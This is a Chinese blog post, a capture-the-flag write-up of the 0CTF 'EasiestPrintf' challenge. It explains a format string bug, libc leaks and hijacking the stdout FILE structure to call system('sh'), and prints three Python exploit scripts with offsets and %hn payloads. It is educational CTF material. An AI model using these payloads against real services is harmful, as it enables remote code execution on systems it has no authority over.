@@ -1,0 +1,364 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   0CTF-EasiestPrintf真的很easy
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年06月17日 14:52:01
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：997
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <div class="markdown_views">
+    <p>
+     这次给大家带来的是0CTF中的一题EasiestPrintf。
+    </p>
+    <p>
+     废话不多说，直接上题。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144744317?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     可以看到开了很多保护。其中
+     <code>
+      full relro
+     </code>
+     说明got表不可修改。(我也是看别人写的，没有实践过，大家可以试着去改下got表)
+     <br/>
+     前面的老套路就不说了。
+     <br/>
+     IDA查看反汇编。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144802955?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144810190?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     漏洞就在这两个函数里，而且都是格式化字符串漏洞。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144825177?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     但是有一点我们可以观察到，在第二个printf之后直接调用了exit()函数，程序直接退出，这就有点不寻常了，通常我们通过格式化漏洞修改返回地址或什么的，达到控制程序流的目的，但是这里在执行完printf之后没有空间在让我们执行其它的命令。
+     <br/>
+     其实这有就涉及到格式化漏洞的关键问题：往哪写，写什么的问题了。
+     <br/>
+     刚开始一点思路也没有。于是上网搜了下。看到一位大神的分析，大家可以看看。
+    </p>
+    <blockquote>
+     <p>
+      <a href="https://xianzhi.aliyun.com/forum/read/1452.html" rel="nofollow" target="_blank">
+       https://xianzhi.aliyun.com/forum/read/1452.html
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     这个思路很不错。而且实现起来也比较容易。但是我在复现脚本的时候，却怎么也调不通丫。
+     <br/>
+     文中提到了printf函数也会有
+     <code>
+      __kernel_vsyscal
+     </code>
+     调用，提示我们做好相关的内存布局，我觉得问题就是出在这里，于是我便一步步的挖掘深入，看看究竟是在何时进行了
+     <code>
+      __kernel_vsyscal
+     </code>
+     的调用。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144849816?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     经过大量的调试发现printf函数只要是通过
+     <code>
+      _IO_vfprintf
+     </code>
+     函数进行写操作(不知道说的准不准确，也就是说通过调用这个函数，相应的地址就被我们给修改了)
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144856675?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     一路走过。我们来到了这里。下一个call就是
+     <code>
+      __kernel_vsyscal
+     </code>
+     调用。此时的
+     <code>
+      __kernel_vsyscal
+     </code>
+     已经被我所修改。
+     <br/>
+     那么这就产生一个问题。我本意是想通过exit中的
+     <code>
+      __kernel_vsyscal
+     </code>
+     调用来达到控制栈的目的.但是现在在
+     <code>
+      printf
+     </code>
+     中,我无法正常的返回.因此我觉得这种方法不可取..
+     <br/>
+     附上一个错误的脚本.
+    </p>
+    <pre class="prettyprint"><code class=" hljs perl">from zio import *
+import <span class="hljs-keyword">time</span>
+import struct
+target=(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">10000</span>)
+<span class="hljs-comment">#target=('124.42.117.57',8885)</span>
+io = zio(target, timeout=<span class="hljs-number">10000</span>, print_read=COLORED(RAW, <span class="hljs-string">'red'</span>), print_write=COLORED(RAW, <span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+io.read_until(<span class="hljs-string">'Which address you wanna read:'</span>)
+io.writeline(<span class="hljs-string">'134520776'</span>)<span class="hljs-comment">#print_got</span>
+test=io.<span class="hljs-keyword">read</span>(<span class="hljs-number">15</span>)
+printf_libc=<span class="hljs-keyword">int</span>(test[<span class="hljs-number">0</span>:<span class="hljs-number">11</span>],<span class="hljs-number">16</span>)
+libc_base=printf_libc-<span class="hljs-number">0x0004D410</span> 
+_write=libc_base+<span class="hljs-number">0xdafe0</span> <span class="hljs-comment">#guan jian diao yong syscall</span>
+duan1=libc_base+<span class="hljs-number">0x6DF20</span>
+<span class="hljs-keyword">syscall</span>=printf_libc-<span class="hljs-number">0x4DAC0</span>
+rop_addr=libc_base+<span class="hljs-number">0x00073430</span>     <span class="hljs-comment">#add esp 30h</span>
+bin<span class="hljs-number">_</span>=libc_base+<span class="hljs-number">0x0016084C</span>
+len1=(rop_addr &amp; <span class="hljs-number">0xff</span>) - <span class="hljs-number">0x8</span>
+len2=((rop_addr % <span class="hljs-number">0x1000000</span>)&gt;&gt;<span class="hljs-number">8</span>) - len1 -<span class="hljs-number">0x8</span>
+io.read_until(<span class="hljs-string">'Bye'</span>)
+payload=l32(<span class="hljs-keyword">syscall</span>)+l32(<span class="hljs-keyword">syscall</span>+<span class="hljs-number">0x1</span>) <span class="hljs-comment">#test .bss  0x0804A020  #syscall</span>
+payload+=<span class="hljs-string">'%'</span>+str(len1)+<span class="hljs-string">'x'</span>+<span class="hljs-string">'%7$hhn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(len2)+<span class="hljs-string">'x'</span>+<span class="hljs-string">'%8$hn'</span>+<span class="hljs-string">'..'</span>
+payload+=<span class="hljs-string">'a'</span><span class="hljs-variable">*10</span>
+io.writeline(payload)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'printf_libc:'</span>,<span class="hljs-keyword">hex</span>(printf_libc)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base:'</span>,<span class="hljs-keyword">hex</span>(libc_base)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'syscall:'</span>,<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">syscall</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'rop_addr:'</span>,<span class="hljs-keyword">hex</span>(rop_addr)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'bin_:'</span>,<span class="hljs-keyword">hex</span>(bin<span class="hljs-number">_</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'_write'</span>,<span class="hljs-keyword">hex</span>(_write)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'duan1'</span>,<span class="hljs-keyword">hex</span>(duan1)
+
+c2=raw_input(<span class="hljs-string">'go1?'</span>)
+
+io.interact()</code></pre>
+    <p>
+     其实在跟进printf函数时我们会有很多的发现.
+     <br/>
+     下面我主要来说说,我师父提供的思路.
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144937238?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     我们可以看到这一段代码.它往栈上压了三个参数.如果我们可以控制
+     <code>
+      [ecx+0x1c]
+     </code>
+     对应的函数，以及
+     <code>
+      esi，edx，eax
+     </code>
+     那么我们便可以调用
+     <code>
+      system
+     </code>
+     函数。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617144957303?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     此时的寄存器和
+     <code>
+      stack
+     </code>
+     如上图。第一个参数为
+     <code>
+      stdout
+     </code>
+     的值
+     <code>
+      esi，ecx
+     </code>
+     对应的都是libc中函数，我们可以查看一下是否可以修改。可以修改，我们通过向上查找可以找到对应的地址。
+     <br/>
+     这里面有很多的小细节，如果要一一展示还是很费劲的。干脆我就一笔带过了。(实在是懒了，其实在找的过程中遇到了很多问题，自己也总结了一些调试的小技巧，但是由于当时的脚本没有备份，我也就懒得再去把错误的展示出来了)。
+     <br/>
+     这里我主要就一个地方加以说明。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617145004085?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     就是这个函数，刚开始我认为这个函数就是写地址的，不需要跟进。但后来发现我们所修改的一个指针和其能否完成地址的写入密切相关。于是在脚本中，我调整了写入的顺序，将指针的修改放在了最后(这其中也有部分原因是我看了师傅的脚本启发的)。在跟进这个函数中可以说花了很多时间。
+     <br/>
+     总之，我们能够控制
+     <code>
+      call [ecx+0x1c]
+     </code>
+     时的参数了。这样差不多就大工告成了。
+     <br/>
+     最后在call时参数如图。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617145011803?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617145025460?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170617145034069?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     这道题花了我很多时间去调试，收获很多，知道了如何更高效的调试，libc中如何调用函数，以及可利用的代码的特征。(说的很少，更多的要去体会，实践)
+     <br/>
+     最后贴上自己和师傅的exp:
+    </p>
+    <pre class="prettyprint"><code class=" hljs perl">Myshell.py:（有些调试过程在py中会有体现）
+from zio import *
+import struct
+import <span class="hljs-keyword">time</span>
+target=(<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-number">10000</span>)
+io=zio(target,timeout=<span class="hljs-number">10000</span>,print_read=COLORED(RAW,<span class="hljs-string">'red'</span>),print_write=COLORED(RAW,<span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+io.read_until(<span class="hljs-string">'Which address you wanna read:'</span>)
+io.writeline(<span class="hljs-string">'134520776'</span>)<span class="hljs-comment">#print_got</span>
+test=io.<span class="hljs-keyword">read</span>(<span class="hljs-number">15</span>)
+printf_libc=<span class="hljs-keyword">int</span>(test[<span class="hljs-number">0</span>:<span class="hljs-number">11</span>],<span class="hljs-number">16</span>)
+libc_base=printf_libc-<span class="hljs-number">0x0004D410</span> 
+<span class="hljs-keyword">system</span>=libc_base+<span class="hljs-number">0x00040310</span> 
+bin<span class="hljs-number">_</span>=libc_base+<span class="hljs-number">0x0016084C</span>
+file_jump=libc_base+<span class="hljs-number">0x1AAAA0</span>
+stdout=libc_base+<span class="hljs-number">0x1ABAC0</span>
+duan_ecx1=libc_base+<span class="hljs-number">0x4870D</span>
+fp_file_jump_ecx=libc_base+<span class="hljs-number">0x1ABB54</span>
+fp_file_jump=libc_base+<span class="hljs-number">0x1ABB50</span>
+fp_file_jump_ecx_write=fp_file_jump-<span class="hljs-number">0x1c</span>
+fp_file_jump_write=<span class="hljs-keyword">system</span>
+
+_IO_vfprintf=libc_base+<span class="hljs-number">0x48696</span>
+<span class="hljs-comment">#wenti=libc_base+0x46EE3</span>
+<span class="hljs-comment">#wenti2=libc_base+0x46C31</span>
+<span class="hljs-comment">#wenti3=libc_base+0x4772B  #zhe li you wen ti</span>
+<span class="hljs-comment">#wenti4=libc_base+0x44DEF</span>
+fp_file_jump_write_len1=(fp_file_jump_write &amp; <span class="hljs-number">0xffff</span>) -<span class="hljs-number">0x14</span>
+fp_file_jump_write_len2=<span class="hljs-number">0x100000</span> + (fp_file_jump_write / <span class="hljs-number">0x10000</span>) - fp_file_jump_write_len1 - <span class="hljs-number">0x14</span>
+sh_write_len1=(<span class="hljs-number">0x156873</span>) - fp_file_jump_write_len1 - fp_file_jump_write_len2 -<span class="hljs-number">0x14</span>
+sh_write_len2=<span class="hljs-number">0x200000</span> - fp_file_jump_write_len1 - fp_file_jump_write_len2 - sh_write_len1 -<span class="hljs-number">0x14</span>
+fp_file_jump_ecx_write_len1=(fp_file_jump_ecx_write % <span class="hljs-number">0x1000000</span>) - fp_file_jump_write_len1 - fp_file_jump_write_len2 - sh_write_len1 - sh_write_len2 - <span class="hljs-number">0x14</span>
+<span class="hljs-comment">#fp_file_jump_ecx_write_len2=(fp_file_jump_ecx_write )</span>
+<span class="hljs-comment">#payload=l32(0x0804A030)+l32(0x0804A030+0x2)+l32(0x0804A030+0x4)+l32(0x0804A030+0x6)+l32(0x0804A030+0x8)</span>
+payload=l32(fp_file_jump)+l32(fp_file_jump+<span class="hljs-number">0x2</span>)+l32(stdout)+l32(stdout+<span class="hljs-number">0x2</span>)+l32(fp_file_jump_ecx)
+payload+=<span class="hljs-string">'%'</span>+str(fp_file_jump_write_len1)+<span class="hljs-string">'x%7$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(fp_file_jump_write_len2)+<span class="hljs-string">'x%8$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(sh_write_len1)+<span class="hljs-string">'x%9$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(sh_write_len2)+<span class="hljs-string">'x%10$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(fp_file_jump_ecx_write_len1)+<span class="hljs-string">'x%11$hn'</span>
+<span class="hljs-comment">#payload+='%'+str(fp_file_jump_write_len2)+'x%10$hn'</span>
+payload+=<span class="hljs-string">'a'</span><span class="hljs-variable">*(</span><span class="hljs-number">0x30</span>-len(payload))
+io.read_until(<span class="hljs-string">'Bye'</span>)
+io.writeline(payload)
+<span class="hljs-comment">#print 'wenti4:',hex(wenti4)</span>
+<span class="hljs-comment">#print 'wenti3:',hex(wenti3)</span>
+<span class="hljs-comment">#print 'wenti2:',hex(wenti2)</span>
+<span class="hljs-comment">#print 'wenti:',hex(wenti)</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fp_file_jump:'</span>,<span class="hljs-keyword">hex</span>(fp_file_jump)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fp_file_jump_write:'</span>,<span class="hljs-keyword">hex</span>(fp_file_jump_write)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fp_file_jump_ecx:'</span>,<span class="hljs-keyword">hex</span>(fp_file_jump_ecx)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fp_file_jump_ecx_write:'</span>,<span class="hljs-keyword">hex</span>(fp_file_jump_ecx_write)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'_IO_vfprintf:'</span>,<span class="hljs-keyword">hex</span>(_IO_vfprintf)
+<span class="hljs-comment">#print 'fp_file_jump:',hex(fp_file_jump)  #ke xiu gai</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">'duan_ecx1:'</span>,<span class="hljs-keyword">hex</span>(duan_ecx1)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stdout:'</span>,<span class="hljs-keyword">hex</span>(stdout)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'file_jump:'</span>,<span class="hljs-keyword">hex</span>(file_jump)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base:'</span>,<span class="hljs-keyword">hex</span>(libc_base)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'system:'</span>,<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">system</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'bin_:'</span>,<span class="hljs-keyword">hex</span>(bin<span class="hljs-number">_</span>)
+c2=raw_input(<span class="hljs-string">'go1?'</span>)
+io.interact()</code></pre>
+    <hr/>
+    <pre class="prettyprint"><code class=" hljs perl">shifu.py：
+from zio import *
+import <span class="hljs-keyword">time</span>
+import struct
+target=(<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-number">10000</span>)
+io = zio(target, timeout=<span class="hljs-number">10000</span>, print_read=COLORED(RAW, <span class="hljs-string">'red'</span>), print_write=COLORED(RAW, <span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+io.read_until(<span class="hljs-string">'Which address you wanna read:'</span>)
+io.writeline(str(<span class="hljs-number">0x08049FC4</span>))
+io.read_until(<span class="hljs-string">'0x'</span>)
+test=io.<span class="hljs-keyword">read</span>(<span class="hljs-number">8</span>)
+<span class="hljs-keyword">read</span>=<span class="hljs-keyword">int</span>(test,<span class="hljs-number">16</span>)
+libc=<span class="hljs-keyword">read</span>-<span class="hljs-number">0xDAF60</span>
+duandian=libc+<span class="hljs-number">0x6F3CD</span>
+fp=libc+<span class="hljs-number">0x1ABB54</span>
+fake=libc+<span class="hljs-number">0x1ABB34</span>
+duan2=libc+<span class="hljs-number">0x48727</span>
+stdout=libc+<span class="hljs-number">0x1ABAC0</span>
+fp2=libc+<span class="hljs-number">0x1ABB50</span>
+wenti=libc+<span class="hljs-number">0x46EE3</span>
+_IO_vfprintf=libc+<span class="hljs-number">0x48696</span>
+<span class="hljs-keyword">system</span>=libc+<span class="hljs-number">0x40310</span>
+systeml=<span class="hljs-keyword">system</span><span class="hljs-variable">%0x10000</span>
+systemh=<span class="hljs-keyword">system</span>/<span class="hljs-number">0x10000</span>+<span class="hljs-number">0x10000</span>-systeml
+sh=<span class="hljs-number">0x6873</span>+<span class="hljs-number">0x20000</span>-(systemh+systeml)
+end=<span class="hljs-number">0x30000</span>-(systemh+systeml+sh)
+fakel=fake<span class="hljs-variable">%0x10000</span>+<span class="hljs-number">0x40000</span>-(systemh+systeml+sh+end)
+payload=<span class="hljs-string">''</span>
+payload+=<span class="hljs-string">'%'</span>+str(systeml)+<span class="hljs-string">'x'</span>
+payload+=<span class="hljs-string">'%27$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(systemh)+<span class="hljs-string">'x'</span>
+payload+=<span class="hljs-string">'%28$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(sh)+<span class="hljs-string">'x'</span>
+payload+=<span class="hljs-string">'%29$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(end)+<span class="hljs-string">'x'</span>
+payload+=<span class="hljs-string">'%30$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(fakel)+<span class="hljs-string">'x'</span>
+payload+=<span class="hljs-string">'%31$hn'</span>
+payload+=<span class="hljs-string">'2'</span><span class="hljs-variable">*(</span><span class="hljs-number">0x50</span>-len(payload))
+payload+=l32(fp2)
+payload+=l32(fp2+<span class="hljs-number">2</span>)
+payload+=l32(stdout)
+payload+=l32(stdout+<span class="hljs-number">2</span>)
+payload+=l32(fp)
+io.read_until(<span class="hljs-string">'Good Bye'</span>)
+io.writeline(payload)
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(libc)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'_IO_vfprintf:'</span>,<span class="hljs-keyword">hex</span>(_IO_vfprintf)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'wenti'</span>,<span class="hljs-keyword">hex</span>(wenti)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fp'</span>,<span class="hljs-keyword">hex</span>(fp)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fp2'</span>,<span class="hljs-keyword">hex</span>(fp2)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fake'</span>,<span class="hljs-keyword">hex</span>(fake)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'fakel'</span>,<span class="hljs-keyword">hex</span>(fakel)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'duandian'</span>,<span class="hljs-keyword">hex</span>(duandian)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'duan2'</span>,<span class="hljs-keyword">hex</span>(duan2)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stdout'</span>,<span class="hljs-keyword">hex</span>(stdout)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'system'</span>,<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">system</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'sh'</span>,<span class="hljs-keyword">hex</span>(sh)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'end'</span>,<span class="hljs-keyword">hex</span>(end)
+c2=raw_input(<span class="hljs-string">'go2?'</span>)
+io.interact()</code></pre>
+    <p>
+     补充：经过测试这种直接对printf进行劫持的利用方法在其它题目中也同样适用。我拿ISCC的pwn1试了一下，很快就拿到shell了。大家也可以自己去测试一下。
+    </p>
+   </div>
+   <link href="https://csdnimg.cn/release/phoenix/template/css/markdown_views-ea0013b516.css" rel="stylesheet"/>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/73380290
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
